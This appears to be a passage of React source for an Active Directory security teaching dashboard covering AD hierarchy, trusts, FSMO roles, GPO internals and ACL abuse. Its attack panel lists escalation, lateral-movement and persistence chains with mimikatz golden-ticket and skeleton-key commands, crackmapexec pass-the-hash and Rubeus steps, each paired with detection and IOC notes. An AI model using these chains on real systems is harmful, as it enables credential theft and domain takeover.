import { useState } from "react";

const C = {
  bg: "#07080c",
  panel: "#090b13",
  header: "#0c0f1c",
  border: "#18203a",
  cyan: "#00c0f0",
  green: "#00e070",
  red: "#ff2040",
  orange: "#ff8800",
  yellow: "#eec020",
  purple: "#8850f0",
  teal: "#00c8a8",
  pink: "#f030a0",
  lime: "#80d020",
  sky: "#30b0f8",
  gold: "#d09010",
  blue: "#3070f0",
  indigo: "#6060e8",
  text: "#a8b8cc",
  dim: "#406070",
  bright: "#d0e4f8",
};

const mono = "'JetBrains Mono','Cascadia Code','Fira Code',monospace";

const S = {
  root: { background: C.bg, color: C.text, fontFamily: mono, minHeight: "100vh", fontSize: "12.5px", lineHeight: "1.65" },
  bar: { background: C.header, borderBottom: `1px solid ${C.border}`, padding: "7px 20px", display: "flex", alignItems: "center", gap: "14px", position: "sticky", top: 0, zIndex: 100 },
  dot: c => ({ width: 9, height: 9, borderRadius: "50%", background: c, display: "inline-block" }),
  wrap: { maxWidth: "1220px", margin: "0 auto", padding: "18px 14px", display: "flex", flexDirection: "column", gap: "14px" },
  panel: c => ({ background: C.panel, border: `1px solid ${c || C.border}`, borderRadius: "5px", overflow: "hidden" }),
  ph: c => ({ background: C.header, borderBottom: `1px solid ${c || C.border}`, padding: "9px 15px", display: "flex", alignItems: "center", gap: "9px" }),
  pt: c => ({ color: c || C.cyan, fontWeight: "700", fontSize: "11px", letterSpacing: "1.8px", textTransform: "uppercase" }),
  pb: { padding: "15px" },
  code: { background: "#040508", border: `1px solid ${C.border}`, borderRadius: "4px", padding: "11px 13px", fontFamily: mono, fontSize: "11.5px", overflowX: "auto", whiteSpace: "pre", lineHeight: "1.75" },
  grid2: { display: "grid", gridTemplateColumns: "1fr 1fr", gap: "14px" },
  grid3: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "11px" },
  grid4: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr 1fr", gap: "10px" },
  badge: c => ({ background: `${c}1a`, border: `1px solid ${c}55`, color: c, borderRadius: "3px", padding: "2px 7px", fontSize: "10.5px", fontWeight: "700" }),
  tag: c => ({ display: "inline-block", background: `${c}14`, border: `1px solid ${c}40`, color: c, borderRadius: "3px", padding: "1px 6px", fontSize: "10.5px", margin: "2px" }),
  sep: { borderColor: C.border, margin: "11px 0", borderStyle: "dashed", borderWidth: "0 0 1px 0" },
  row: { display: "flex", gap: "9px", marginBottom: "7px", alignItems: "flex-start" },
  bul: c => ({ color: c || C.cyan, minWidth: "13px", fontWeight: "700", marginTop: "1px" }),
  tab: (a, c) => ({ padding: "6px 13px", cursor: "pointer", fontFamily: mono, background: a ? `${c}1a` : "transparent", border: `1px solid ${a ? c : C.border}`, borderRadius: "4px", color: a ? c : C.dim, fontSize: "10.5px", fontWeight: a ? "700" : "400", letterSpacing: "0.5px", transition: "all 0.15s" }),
};

const PB = ({ title, icon, color, accent, children }) => (
  <div style={S.panel(accent || color || C.border)}>
    <div style={S.ph(accent || color || C.border)}>
      <span>{icon}</span><span style={S.pt(color || C.cyan)}>{title}</span>
    </div>
    <div style={S.pb}>{children}</div>
  </div>
);
const Pill = ({ c, children }) => <span style={S.badge(c || C.cyan)}>{children}</span>;
const Tag  = ({ c, children }) => <span style={S.tag(c || C.cyan)}>{children}</span>;
const Row  = ({ c, b, children }) => (
  <div style={S.row}><span style={S.bul(c)}>{b || "▸"}</span><span style={{ color: C.text }}>{children}</span></div>
);
const KV = ({ k, v, kc }) => (
  <div style={{ display: "flex", gap: "8px", marginBottom: "5px" }}>
    <span style={{ color: kc || C.teal, minWidth: "200px", fontWeight: "600" }}>{k}</span>
    <span style={{ color: C.dim }}>:</span><span style={{ color: C.bright }}>{v}</span>
  </div>
);

/* ── AD Forest / Domain / OU Hierarchy SVG ─────────────────────────────── */
const ADHierarchy = () => (
  <svg viewBox="0 0 760 500" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#406070" fontSize="10" letterSpacing="2">ACTIVE DIRECTORY LOGICAL HIERARCHY — FOREST · DOMAIN · OU · OBJECTS</text>

    {/* Forest boundary */}
    <rect x="10" y="22" width="740" height="468" rx="6" fill="#07080c" stroke="#8850f055" strokeWidth="2" />
    <text x="380" y="42" textAnchor="middle" fill="#8850f0" fontSize="11" fontWeight="800" letterSpacing="2">FOREST: corp.local</text>
    <text x="380" y="56" textAnchor="middle" fill="#406070" fontSize="9">Schema partition · Configuration partition · Kerberos realm boundary · Security boundary</text>

    {/* Root domain */}
    <rect x="260" y="64" width="240" height="46" rx="4" fill="#0a0c18" stroke="#eec02066" strokeWidth="2" />
    <text x="380" y="84" textAnchor="middle" fill="#eec020" fontSize="11" fontWeight="700">corp.local (Root Domain)</text>
    <text x="380" y="99" textAnchor="middle" fill="#406070" fontSize="9">Domain partition · Global Catalog · PDC Emulator (FSMO)</text>

    {/* Child domains */}
    <rect x="50" y="138" width="200" height="46" rx="4" fill="#0a0c18" stroke="#00c0f066" strokeWidth="1.5" />
    <text x="150" y="157" textAnchor="middle" fill="#00c0f0" fontSize="10" fontWeight="700">us.corp.local</text>
    <text x="150" y="172" textAnchor="middle" fill="#406070" fontSize="9">Child domain · own DCs</text>

    <rect x="510" y="138" width="200" height="46" rx="4" fill="#0a0c18" stroke="#00c8a866" strokeWidth="1.5" />
    <text x="610" y="157" textAnchor="middle" fill="#00c8a8" fontSize="10" fontWeight="700">eu.corp.local</text>
    <text x="610" y="172" textAnchor="middle" fill="#406070" fontSize="9">Child domain · own DCs</text>

    {/* Trust lines */}
    <line x1="260" y1="110" x2="150" y2="138" stroke="#eec02044" strokeWidth="1.5" strokeDasharray="5,3" />
    <text x="185" y="127" fill="#eec02066" fontSize="8">transitive trust</text>
    <line x1="500" y1="110" x2="610" y2="138" stroke="#eec02044" strokeWidth="1.5" strokeDasharray="5,3" />
    <text x="545" y="127" fill="#eec02066" fontSize="8">transitive trust</text>

    {/* OUs in root domain */}
    <text x="380" y="210" textAnchor="middle" fill="#406070" fontSize="9" letterSpacing="1">ORGANIZATIONAL UNITS (corp.local)</text>
    {[
      { name: "OU=Domain Controllers", color: C.red, x: 20, desc: "All DC objects. Default GPO: Default Domain Controllers Policy", objs: ["DC01 (PDC Emulator)", "DC02 (BDC)", "DC03 (RODC)"] },
      { name: "OU=Workstations", color: C.cyan, x: 200, desc: "Managed endpoints. GPO: workstation hardening, AppLocker", objs: ["WKSTN-001", "WKSTN-002", "…(N)"] },
      { name: "OU=Servers", color: C.orange, x: 380, desc: "Member servers, IIS, SQL, file servers. Server hardening GPO", objs: ["SRV-SQL01", "SRV-IIS01", "SRV-FILE01"] },
      { name: "OU=Users", color: C.green, x: 560, desc: "Standard user accounts. Password/lockout policy GPO", objs: ["jsmith", "alice", "bob", "…"] },
    ].map(({ name, color, x, desc, objs }) => (
      <g key={name}>
        <rect x={x} y={218} width="168" height="110" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + 84} y={238} textAnchor="middle" fill={color} fontSize="9.5" fontWeight="700">{name.replace("OU=","")}</text>
        <text x={x + 84} y={252} textAnchor="middle" fill="#406070" fontSize="8">{desc.slice(0,38)}</text>
        {objs.map((o, i) => (
          <g key={o}>
            <rect x={x + 8} y={262 + i * 19} width="152" height="16" rx="2" fill={`${color}0c`} stroke={`${color}22`} strokeWidth="1" />
            <text x={x + 84} y={274 + i * 19} textAnchor="middle" fill="#6a8090" fontSize="8.5">{o}</text>
          </g>
        ))}
      </g>
    ))}

    {/* AD Object types */}
    <text x="380" y="350" textAnchor="middle" fill="#406070" fontSize="9" letterSpacing="1">AD OBJECT CLASSES (stored in LDAP directory)</text>
    {[
      { type: "User", attrs: "sAMAccountName\nSID · memberOf\npwdLastSet · UAC", color: C.green, x: 20 },
      { type: "Computer", attrs: "sAMAccountName$\nDNSHostName · OS\nServicePrincipalName", color: C.cyan, x: 150 },
      { type: "Group", attrs: "groupType\nmember / memberOf\nSecurity vs Distribution", color: C.purple, x: 280 },
      { type: "GPO link", attrs: "gPLink · gPOptions\ngPCFileSysPath\nVersionNumber", color: C.orange, x: 410 },
      { type: "Service Account\n(gMSA)", attrs: "msDS-GroupMSA\nReadersGroupSid\nAutoRotate 240char", color: C.teal, x: 540 },
      { type: "Domain\nController", attrs: "serverReference\nuSNChanged\nhasMasterNCs (FSMO)", color: C.yellow, x: 660 },
    ].map(({ type, attrs, color, x }) => (
      <g key={type}>
        <rect x={x} y={358} width="118" height="90" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + 59} y={376} textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{type.split("\n")[0]}</text>
        {type.includes("\n") && <text x={x + 59} y={390} textAnchor="middle" fill={color} fontSize="9">{type.split("\n")[1]}</text>}
        {attrs.split("\n").map((a, i) => (
          <text key={a} x={x + 59} y={(type.includes("\n") ? 405 : 392) + i * 13} textAnchor="middle" fill="#406070" fontSize="8.5">{a}</text>
        ))}
      </g>
    ))}

    <text x="380" y="468" textAnchor="middle" fill="#406070" fontSize="8.5">Distinguished Name example: CN=jsmith,OU=Users,DC=corp,DC=local · objectSid: S-1-5-21-&lt;domain&gt;-&lt;RID&gt; · objectGUID: globally unique</text>
  </svg>
);

/* ── Trust Map SVG ────────────────────────────────────────────────────── */
const TrustMap = () => (
  <svg viewBox="0 0 760 400" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#406070" fontSize="10" letterSpacing="2">AD TRUST RELATIONSHIPS — TYPES · DIRECTION · TRANSITIVITY</text>

    {/* Domains */}
    {[
      { label: "corp.local\n(Root Forest A)", color: C.yellow, x: 280, y: 40, w: 200, h: 56 },
      { label: "us.corp.local\n(Child Domain)", color: C.cyan, x: 80, y: 160, w: 180, h: 48 },
      { label: "eu.corp.local\n(Child Domain)", color: C.teal, x: 500, y: 160, w: 180, h: 48 },
      { label: "partner.com\n(External Forest B)", color: C.orange, x: 40, y: 310, w: 200, h: 48 },
      { label: "acquired.net\n(Forest C - acquired)", color: C.purple, x: 520, y: 310, w: 200, h: 48 },
    ].map(({ label, color, x, y, w, h }) => (
      <g key={label}>
        <rect x={x} y={y} width={w} height={h} rx="4" fill={`${color}0c`} stroke={`${color}55`} strokeWidth="1.5" />
        <text x={x + w/2} y={y + 22} textAnchor="middle" fill={color} fontSize="10.5" fontWeight="700">{label.split("\n")[0]}</text>
        <text x={x + w/2} y={y + 37} textAnchor="middle" fill="#406070" fontSize="9">{label.split("\n")[1]}</text>
      </g>
    ))}

    {/* Trust arrows + labels */}
    {[
      { x1: 280, y1: 68, x2: 170, y2: 160, color: C.cyan, label: "Parent-Child\nTransitive 2-way\n(auto-created)", lx: 170, ly: 120 },
      { x1: 480, y1: 68, x2: 590, y2: 160, color: C.teal, label: "Parent-Child\nTransitive 2-way\n(auto-created)", lx: 540, ly: 120 },
      { x1: 170, y1: 208, x2: 70, y2: 310, color: C.orange, label: "External Trust\nNon-transitive\n1-way (selective)", lx: 50, ly: 265 },
      { x1: 590, y1: 208, x2: 620, y2: 310, color: C.purple, label: "Forest Trust\nTransitive (opt)\n2-way", lx: 660, ly: 265 },
      { x1: 260, y1: 300, x2: 140, y2: 310, color: C.gold, label: "Shortcut Trust\n(cross-domain\nspeed up Kerberos)", lx: 175, ly: 295 },
    ].map(({ x1, y1, x2, y2, color, label, lx, ly }) => (
      <g key={label}>
        <line x1={x1} y1={y1} x2={x2} y2={y2} stroke={`${color}88`} strokeWidth="1.5" strokeDasharray="5,3" />
        {label.split("\n").map((l, i) => (
          <text key={l} x={lx} y={ly + i * 12} textAnchor="middle" fill={color} fontSize="8.5" fontWeight={i === 0 ? "700" : "400"}>{l}</text>
        ))}
      </g>
    ))}

    {/* Trust type legend */}
    <rect x="10" y="358" width="740" height="38" rx="3" fill="#0a0c14" stroke="#18203a" strokeWidth="1" />
    <text x="20" y="372" fill="#406070" fontSize="9" fontWeight="700">TRUST TYPES:</text>
    {[
      ["Parent-Child", "Auto-created 2-way transitive within forest. us.corp.local ↔ corp.local", C.cyan, 100],
      ["Tree-Root", "New domain tree in same forest. Auto 2-way transitive.", C.teal, 340],
      ["External", "Non-transitive, manually created. Controls access to specific domain.", C.orange, 540],
      ["Forest", "All domains in forest B trusted by forest A. May be selective.", C.purple, 680],
    ].map(([type, desc, color, x]) => (
      <g key={type}>
        <text x={x} y={372} fill={color} fontSize="8.5" fontWeight="700">{type}</text>
        <text x={x} y={387} fill="#406070" fontSize="8">{desc.slice(0, 32)}</text>
      </g>
    ))}

    <text x="380" y="400" textAnchor="middle" fill="#ff204066" fontSize="9" fontWeight="700">⚠ Trust attack: SID History injection, Trust ticket forging, cross-forest BloodHound path abuse</text>
  </svg>
);

/* ── FSMO Roles Panel ───────────────────────────────────────────────────── */
const FSMORoles = () => (
  <div>
    <div style={{ color: C.gold, fontWeight: "700", marginBottom: "10px", fontSize: "11px" }}>▸ FSMO ROLES — FLEXIBLE SINGLE MASTER OPERATIONS (5 per forest/domain)</div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.yellow, fontSize: "11px", fontWeight: "700", marginBottom: "6px" }}>Forest-wide (1 per forest)</div>
        {[
          ["Schema Master", "Controls schema changes (new object classes/attributes). Only DC that can extend AD schema. Forest-wide. Offline = no schema changes possible.", C.purple],
          ["Domain Naming Master", "Controls addition/removal of domains and app partitions. Must be online for dcpromo. Forest-wide, usually on same DC as Schema Master.", C.indigo],
        ].map(([name, desc, c]) => (
          <div key={name} style={{ background: "#090810", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px", marginBottom: "8px" }}>
            <div style={{ color: c, fontWeight: "700", fontSize: "11px" }}>▸ {name}</div>
            <div style={{ color: C.dim, fontSize: "10.5px", marginTop: "3px" }}>{desc}</div>
          </div>
        ))}
      </div>
      <div>
        <div style={{ color: C.cyan, fontSize: "11px", fontWeight: "700", marginBottom: "6px" }}>Domain-wide (1 per domain)</div>
        {[
          ["PDC Emulator", "Most critical FSMO. Time sync for domain, password changes propagation, account lockouts, Group Policy fallback authority. Always on best DC. Kerberos clock skew (5 min) enforced here.", C.red],
          ["RID Master", "Allocates RID pools to DCs. Each object needs unique RID for its SID (S-1-5-21-domain-RID). Offline = DCs exhaust their pool → cannot create objects.", C.orange],
          ["Infrastructure Master", "Maintains cross-domain object references. Keeps phantom objects (references to objects in other domains) current. Should NOT be on Global Catalog unless all DCs are GCs.", C.yellow],
        ].map(([name, desc, c]) => (
          <div key={name} style={{ background: "#080a0e", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px", marginBottom: "8px" }}>
            <div style={{ color: c, fontWeight: "700", fontSize: "11px" }}>▸ {name}</div>
            <div style={{ color: C.dim, fontSize: "10.5px", marginTop: "3px" }}>{desc}</div>
          </div>
        ))}
      </div>
    </div>
    <div style={S.code}>
{`# Identify current FSMO role holders:`}
{`PS> netdom query fsmo`}
{`PS> Get-ADDomain | Select PDCEmulator, RIDMaster, InfrastructureMaster`}
{`PS> Get-ADForest | Select SchemaMaster, DomainNamingMaster`}
{``}
{`# Security note: FSMO seizure = admin attack target`}
{`# If attacker seizes PDC Emulator: controls time sync`}
{`# → Kerberos tickets across domain become invalid (5-min skew)`}
{`# → Authentication chaos across entire domain`}
    </div>
  </div>
);

/* ── GPO Internals ──────────────────────────────────────────────────────── */
const GPOInternals = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ GPO STRUCTURE — TWO COMPONENTS</div>
        <div style={S.code}>
{`1. GPC (Group Policy Container) — in AD LDAP:`}
{`   CN={GUID},CN=Policies,CN=System,DC=corp,DC=local`}
{`   Attributes:`}
{`     gPCFileSysPath → UNC path to SYSVOL`}
{`     gPCMachineExtensionNames → CSE GUIDs`}
{`     versionNumber → policy version (triggers refresh)`}
{`     flags → User/Computer enabled/disabled`}
{``}
{`2. GPT (Group Policy Template) — in SYSVOL:`}
{`   \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{GUID}\\`}
{`     Machine\\ → computer settings`}
{`       Registry.pol → registry settings`}
{`       Scripts\\   → startup/shutdown scripts`}
{`     User\\     → user settings`}
{`       Registry.pol → user registry settings`}
{`     GPT.INI   → version sync file`}
{``}
{`# GPO application order (LSDOU — last wins):`}
{`# Local → Site → Domain → OU (most specific wins)`}
{`# Enforcement (No Override) breaks this: enforced GPO wins`}
{`# Block Inheritance: OU blocks parent GPOs (except enforced)`}
        </div>
      </div>
      <div>
        <div style={{ color: C.teal, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ GPO PROCESSING ENGINE</div>
        {[
          ["Client-Side Extensions (CSE)", "GPO settings processed by CSEs (DLLs). Registry CSE, Security CSE, Script CSE, Software Installation CSE. Each CSE processes relevant section of Registry.pol or other files.", C.teal],
          ["Background refresh cycle", "Default: 90 min ± 0-30 min randomisation. DCs: 5 min. Immediate: gpupdate /force. Security settings: 16 hours even without change.", C.cyan],
          ["WMI filtering", "GPO applies only to objects matching WMI query. e.g. 'Apply only to Win10 machines'. WMI evaluated on client before GPO applied.", C.purple],
          ["Security filtering", "GPO's DACL — who gets Read+Apply permissions. Default: Authenticated Users. Targeted: specific group. Remove from group = GPO not applied.", C.orange],
          ["Loopback processing", "Replace or Merge mode. Replace: only user GPOs linked to computer's OU. Merge: both user's and computer's OUs. Used for kiosk/terminal servers.", C.yellow],
        ].map(([t, d, c]) => (
          <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
            <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
            <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
          </div>
        ))}
      </div>
    </div>
  </div>
);

/* ── ACL/ACE AD Model ───────────────────────────────────────────────────── */
const ADAclModel = () => (
  <div>
    <div style={{ color: C.red, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ AD OBJECT ACLs — DACL ON EVERY AD OBJECT (Attack Surface)</div>
    <div style={S.grid2}>
      <div>
        <div style={S.code}>
{`AD object DACL entry (ACE) fields:`}
{`  AceType      ALLOW / DENY / AUDIT`}
{`  Trustee      WHO gets the right (SID)`}
{`  AccessMask   WHAT right is granted`}
{`  ObjectType   WHICH attribute/class (GUID) — optional`}
{`  InheritedObjectType — applies when inherited to this class`}
{``}
{`Critical AD rights (AccessMask values):`}
{`  GenericAll         0x10000000  Full control`}
{`  GenericWrite       0x40000000  Write any property`}
{`  WriteOwner         0x00080000  Change object owner`}
{`  WriteDACL          0x00040000  Modify DACL itself`}
{`  AllExtendedRights  0x00000100  All special rights`}
{`  ForceChangePassword (Extended right GUID)`}
{`  DS-Replication-Get-Changes-All → DCSync`}
{`  Self-Membership → add self to group`}
{``}
{`# Read AD object ACL (PowerShell):`}
{`(Get-ACL "AD:\\CN=jsmith,OU=Users,DC=corp,DC=local").Access`}
{``}
{`# BloodHound maps these into attack graph edges:`}
{`# GenericAll → owned; ForceChangePassword → pwn user`}
        </div>
      </div>
      <div>
        <div style={{ color: C.red, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ DANGEROUS ACE PATTERNS (BloodHound edges)</div>
        {[
          ["GenericAll on user", "Full control over user object → reset password, disable account, add to group, read LAPS password. Instant user takeover.", C.red],
          ["WriteDACL on group", "Modify the group's DACL → grant yourself GenericAll → add yourself to group. Classic ACL abuse escalation path.", C.orange],
          ["WriteOwner on object", "Become the object's owner → as owner, grant yourself DACL rights → full control. Two-step privilege escalation.", C.yellow],
          ["AllExtendedRights on user", "Includes ForceChangePassword → change password without knowing current one. No LSASS interaction.", C.red],
          ["GenericWrite on computer", "Write msDS-AllowedToActOnBehalfOfOtherIdentity → Resource-Based Constrained Delegation → impersonate any user to that computer (S4U2Proxy).", C.purple],
          ["WriteProperty (member) on group", "Self-membership or write member attribute → add any account to privileged group. GPO changes flow from this.", C.orange],
        ].map(([t, d, c]) => (
          <div key={t} style={{ background: "#0e0808", border: `1px solid ${c}33`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
            <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>⚠ {t}</div>
            <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
          </div>
        ))}
      </div>
    </div>
  </div>
);

/* ── AD Attack Techniques ───────────────────────────────────────────────── */
const ADAttackPanel = ({ tab }) => {
  const attacks = {
    escalation: [
      { name: "ACL Abuse — GenericAll to Domain Admin", color: C.red,
        chain: ["Identify: BloodHound shows jsmith has GenericAll on svc_admin (service account)", "Abuse: Set-ADAccountPassword svc_admin → new password we control", "Verify: svc_admin has WriteOwner on IT-Admins group", "Escalate: Set-ADObject IT-Admins -Replace @{Owner=jsmith}", "Then: Add jsmith to IT-Admins", "IT-Admins has GenericAll on Domain Admins → add jsmith to DA"],
        detect: "Event 4723/4724 (password reset without old password). Event 4756 (member added to group). BloodHound shortest path from owned nodes. AD audit: track GenericAll/WriteDACL ACE grants.", ioc: "Non-admin account resetting service account password (Event 4724). User added to admin group without IT ticket (Event 4756 from unexpected account)." },
      { name: "Resource-Based Constrained Delegation (RBCD)", color: C.purple,
        chain: ["Identify: attacker has GenericWrite on computer object WKSTN-042", "Attacker creates new computer object (MachineAccountQuota allows by default)", "Writes attacker-computer SID to WKSTN-042.msDS-AllowedToActOnBehalfOfOtherIdentity", "S4U2Self: get service ticket for Administrator to attacker-computer", "S4U2Proxy: use that ticket to get ticket for Administrator to WKSTN-042/CIFS", "Now: PSExec to WKSTN-042 as Administrator"],
        detect: "Event 4741 (computer account created). Changes to msDS-AllowedToActOnBehalfOfOtherIdentity attribute (Event 4662 on computer object). Monitor MachineAccountQuota > 0 (default=10).", ioc: "New computer account created by non-admin. Attribute change on msDS-AllowedToActOnBehalfOfOtherIdentity via Event 4662." },
      { name: "GPO Abuse — Immediate Code Execution", color: C.orange,
        chain: ["Identify: jsmith has GenericWrite or CreateChild on GPO linked to IT OU", "Modify GPO startup script: add malicious PowerShell to Machine\\Scripts\\Startup", "Or: modify Registry.pol — run key value pointing to payload", "On next gpupdate/machine restart: payload runs as SYSTEM on all computers in OU", "Or: modify existing GPO that grants 'Restricted Groups' → add attacker to local Admins"],
        detect: "Monitor SYSVOL for GPO file changes (Sysmon Event 11 on SYSVOL path). Event 5136 (AD object modified) on GPO's gPCFileSysPath or version increment. SYSVOL DFS replication logs.", ioc: "Registry.pol or Scripts folder modification in SYSVOL GPO directory. GPO versionNumber increment without corresponding change ticket." },
    ],
    lateral: [
      { name: "Pass-the-Hash Lateral Movement", color: C.red,
        chain: ["LSASS dump from compromised workstation → NT hash for jsmith", "crackmapexec smb 10.0.1.0/24 -u jsmith -H <NT-hash>", "Identify all machines where jsmith is local admin", "PSExec / WMIExec / SMBExec with hash → shell on each target", "Pivot: dump LSASS on each target → accumulate more hashes"],
        detect: "Event 4624 Type 3 with same account from multiple sources in short window. Sysmon Event 10 (LSASS access) on source. crackmapexec network signatures.", ioc: "Same account authenticating to 10+ hosts within 1 minute. NTLM Type 3 logon from workstation to servers (not normal user pattern)." },
      { name: "WMI / DCOM Lateral Movement", color: C.orange,
        chain: ["Compromised account with WMI/DCOM access to target", "WMI: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ...'", "DCOM: [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','target'))", "No new service created, no SMB lateral IoC pattern"],
        detect: "Sysmon Event 3 (network connection) from wmiprvse.exe to unusual destination. Event 4648 explicit credential use. Network detection: DCOM port 135 + dynamic ports.", ioc: "wmiprvse.exe spawning cmd.exe or powershell.exe (Sysmon Event 1). Outbound DCOM from workstation to server in unusual direction." },
      { name: "AdminSDHolder / SDProp Abuse", color: C.purple,
        chain: ["AdminSDHolder: template ACL applied to privileged groups every 60 min by SDProp thread", "If attacker modifies AdminSDHolder's ACL: SDProp propagates that ACE to all protected groups/users", "Add jsmith with WriteDACL to AdminSDHolder DACL", "Wait 60 min → SDProp runs → jsmith has WriteDACL on Domain Admins, Enterprise Admins etc.", "Persistent backdoor that survives group cleanup"],
        detect: "Monitor AdminSDHolder ACL changes: Event 5136 on CN=AdminSDHolder,CN=System,DC=corp,DC=local. Any ACE added here = critical alert. Baseline and diff quarterly.", ioc: "Event 5136 on AdminSDHolder object. Non-default principals in AdminSDHolder DACL. SDPropInterval registry value changed from default 60 minutes." },
    ],
    persistence: [
      { name: "Golden Ticket via KRBTGT Hash", color: C.yellow,
        chain: ["Obtain KRBTGT NT hash (DCSync or DC LSASS dump)", "Forge TGT: mimikatz kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-.. /krbtgt:<hash>", "Ticket valid for up to 10 years. Works for ANY username (even non-existent)", "Access any resource in the domain without re-authentication", "Survives password resets on user accounts (KRBTGT key still valid)"],
        detect: "Tickets with lifetime > domain policy (10h). PAC UserID doesn't match actual AD object. Domain controller: Event 4769 for ticket with impossible account.", ioc: "Kerberos ticket lifetime > 10 hours. Service ticket requests for non-existent accounts. Event 4769 with account that has no corresponding AD object." },
      { name: "Domain Controller Shadow Credentials", color: C.pink,
        chain: ["Attacker with GenericWrite on target account writes msDS-KeyCredentialLink attribute", "Creates Key Trust: fake FIDO2/Windows Hello credential linked to victim account", "Request PKINIT Kerberos auth using the planted key → get TGT as victim", "Extract NT hash via U2U Kerberos exchange (Rubeus asktgt /getcredentials)", "Persists until msDS-KeyCredentialLink attribute is removed"],
        detect: "Event 5136 (attribute modification) on msDS-KeyCredentialLink for user/computer objects. Any write to this attribute by non-PKI systems = suspicious.", ioc: "Event 5136: msDS-KeyCredentialLink modified by non-DC/PKI account. Unexpected PKINIT authentication event for account with no hardware key enrolled." },
      { name: "Skeleton Key — DC Memory Patching", color: C.red,
        chain: ["Domain Admin access on DC", "mimikatz misc::skeleton patches lsass.exe on DC in memory", "Adds master password 'mimikatz' that works for ANY domain account", "Real passwords still work — no disruption, very stealthy", "Persistence until DC reboots (memory-only)"],
        detect: "Skeleton key patches lsass.exe → Sysmon/EDR on DC detects process memory modification. AV/EDR on DC alerts on mimikatz signature. Reboot the DC to clear it.", ioc: "Multiple accounts authenticating simultaneously with different credentials (old password still works). EDR alert on lsass.exe memory write from elevated process on DC." },
    ],
  };
  const items = attacks[tab] || [];
  return (
    <div>
      {items.map(item => (
        <div key={item.name} style={{ background: "#08090d", border: `1px solid ${item.color}33`, borderRadius: "5px", padding: "14px", marginBottom: "12px" }}>
          <div style={{ color: item.color, fontWeight: "800", fontSize: "13px", marginBottom: "10px" }}>{item.name}</div>
          <div style={S.grid2}>
            <div>
              <div style={{ color: item.color, fontWeight: "700", fontSize: "11px", marginBottom: "6px" }}>▸ ATTACK CHAIN</div>
              {item.chain.map((s, i) => (
                <div key={i} style={{ display: "flex", gap: "8px", marginBottom: "5px" }}>
                  <span style={{ color: item.color, fontSize: "10px", minWidth: "16px", fontWeight: "700" }}>{i + 1}.</span>
                  <span style={{ color: C.dim, fontSize: "11px" }}>{s}</span>
                </div>
              ))}
            </div>
            <div>
              <div style={{ color: C.green, fontWeight: "700", fontSize: "11px", marginBottom: "6px" }}>▸ DETECTION</div>
              <div style={{ background: "#08120a", border: `1px solid ${C.green}22`, borderRadius: "3px", padding: "8px", marginBottom: "8px" }}>
                <div style={{ color: C.dim, fontSize: "11px" }}>{item.detect}</div>
              </div>
              <div style={{ color: C.red, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ IOC SIGNATURE</div>
              <div style={{ background: "#120808", border: `1px solid ${C.red}22`, borderRadius: "3px", padding: "8px" }}>
                <div style={{ color: C.dim, fontSize: "11px" }}>{item.ioc}</div>
              </div>
            </div>
          </div>
        </div>
      ))}
    </div>
  );
};

/* ── AD Workflow ────────────────────────────────────────────────────────── */
const ADWorkflow = () => {
  const steps = [
    { id:"01", label:"Machine joins domain (djoin / netdom)", sub:"Computer account created in AD, SPN registered", color:C.cyan, detail:"NetJoinDomain() API → creates computer object in OU=Computers. SPN HOST/computername registered. Machine generates RSA key pair stored in LSA. Machine password auto-rotates every 30 days." },
    { id:"02", label:"DC locator process (DCLocator)", sub:"Client finds nearest DC via DNS SRV + LDAP ping", color:C.teal, detail:"DNS lookup: _ldap._tcp.dc._msdcs.corp.local → SRV records list DC FQDNs. Client sends LDAP ping (DSGetDcName). DC responds with site information. Client prefers same-site DC." },
    { id:"03", label:"Group Policy download begins", sub:"gpsvc reads gPLink on OU → fetches SYSVOL", color:C.orange, detail:"GP Client (gpsvc) connects to SYSVOL via DFS (\\\\corp.local\\SYSVOL). Compares versionNumber in Registry.pol with cached version. Downloads changed GPOs. CSEs process their sections." },
    { id:"04", label:"User logon → Kerberos auth to DC", sub:"AS-REQ with pre-auth → TGT issued", color:C.yellow, detail:"Interactive logon sends AS-REQ to PDC Emulator (for password change detection). TGT returned. User GPOs applied. Profile loaded from roaming profile share if configured." },
    { id:"05", label:"Resource access → TGS-REQ", sub:"Client presents TGT, requests service ticket", color:C.purple, detail:"Access to \\\\fileserver\\share: DNS lookup fileserver → Kerberos TGS-REQ for cifs/fileserver.corp.local SPN. Service ticket returned, presented to file server. PAC checked by file server." },
    { id:"06", label:"Authorization via PAC + group membership", sub:"PAC SIDs compared to file server ACL", color:C.green, detail:"File server checks PAC group SIDs against share/NTFS ACLs. Domain Admins SID in PAC → full control. Standard user SID → read-only per NTFS ACL. Access decision made locally on resource server." },
